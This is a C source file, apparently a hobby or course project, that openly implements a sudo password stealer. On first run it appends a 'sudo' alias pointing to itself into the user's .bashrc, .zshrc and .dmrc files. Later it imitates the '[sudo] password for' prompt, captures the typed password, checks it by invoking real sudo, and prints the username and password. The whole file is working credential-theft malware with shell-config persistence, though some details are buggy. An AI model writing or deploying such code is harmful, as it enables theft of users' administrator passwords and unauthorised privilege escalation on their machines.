#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>
#include "pseudo.h"

#define PASSWD_SIZE 1024
#define UNAME_SIZE 1024

static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};

int main(int argc, char ** argv){

  //set mode
  int mode = P_IMPLANT;
  printf("%d\n", argc);
  for (int i = 0; i<argc; i++){
    if (strcmp(argv[i],"SUDO") == 0){
      mode = P_SUDO;
      break;
    }
  }

  //implant the alias to the virus as sudo...
  if(mode == P_IMPLANT){
    alias_virus();
  }

  //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
  if(mode == P_SUDO){
    char passwd[PASSWD_SIZE];
    char username[UNAME_SIZE];

    steal_password(passwd, username);

    printf("%s's password is %s\n", username, passwd);
  }

  return 0;
}


int get_username(char * uname){
  uid_t uid = getuid();
  struct passwd *pw = getpwuid(uid);
  strcpy(uname, pw -> pw_name);

  return 0;
}

int steal_password(char * passwd, char * username){
  get_username(username);

  char prompt[UNAME_SIZE + 32];

  int correctPasswd = 0;
  while (! correctPasswd){
    sprintf(prompt,"[sudo] password for %s: ", username);

    // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
    char * returned_pass = getpass(prompt);

    // returned_pass[strlen(returned_pass)] = 0;

    strcpy(passwd, returned_pass);

    // If sudo works with password, we know we have the right password
    if (testSudoPassword(passwd) == 0){
      correctPasswd = 1;
    }
    free(returned_pass);
  }

  return 0;
}

int alias_virus(){
  //get the home dir
  char * home_dir_path= getenv("HOME");

  //get the path to the virus
  char path_to_this_exe[1024] = "";
  readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));

  //prepare the alias
  char alias[2048] = "alias sudo=\"";
  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", path_to_this_exe);

  for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
    append_virus(home_dir_path, CONFIGS[i], alias);
  }

  return 0;
}

int append_virus(char * home_dir, char * config_file, char * alias){
  char buffer[1024] = "";

  strcpy(buffer, home_dir);
  strcat(buffer, config_file);

  printf("%s\n", buffer);

  int fd = open(buffer, O_WRONLY|O_CREAT, 0644);
  if(fd < 0){
    perror("no file exists");
    return -1;
  }


  lseek(fd, 0, SEEK_END);
  write(fd, alias, strlen(alias));
  write(fd,"\n",strlen("\n"));


  close(fd);

  return 0;

}

int testSudoPassword(char * passwd){
  // The first three command line arguments are path to file, SUDO, sudo
  char ** fillerArray = (char**)calloc(1, sizeof(char*));
  *(fillerArray) = (char*)malloc(strlen("sudo")*sizeof(char));
  strcpy(*(fillerArray), "sudo");

  return runSudo(passwd, fillerArray);

}

// Runs sudo with given arguments and returns 0 if successful, something else if not
int runSudo(char * passwd, char ** argAry){
  int forkResult = fork();

  // Parent waits for child, returns result of child's sudo
  if (forkResult > 0){
    int status = 0;
    wait(&status);

    int result = WEXITSTATUS(status);

    printf("result: %d\n", result);

    return result;
  }

  // Child runs sudo
  if (forkResult == 0){

    printf("Running sudo\n");
    int execResult = execvp(*(argAry), argAry);
    if (execResult == -1){
      printf("Execvp failed to run sudo\n");
    }
  }

  // Unreachable
  return 0;
}
